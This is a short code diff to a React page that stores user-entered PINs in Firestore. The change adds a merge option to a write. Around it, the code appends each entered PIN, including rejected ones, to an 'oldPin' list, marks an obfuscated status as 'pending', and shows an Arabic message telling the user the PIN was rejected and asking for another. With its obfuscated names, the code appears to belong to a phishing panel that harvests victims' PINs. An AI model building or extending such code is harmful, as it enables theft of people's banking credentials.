@@ -95,7 +95,7 @@ export default function ConfiPage() {
         setDoc(docRef, {
           oldPin: data.oldPin ? [...data.oldPin, currentPin] : [currentPin],
           _v6Status: "pending"
-        }).then(() => {
+        }, { merge: true }).then(() => {
           _ss6("pending")
           _s6("") // Clear the old PIN
           setError("تم رفض الرقم السري. يرجى إدخال رقم صحيح.")
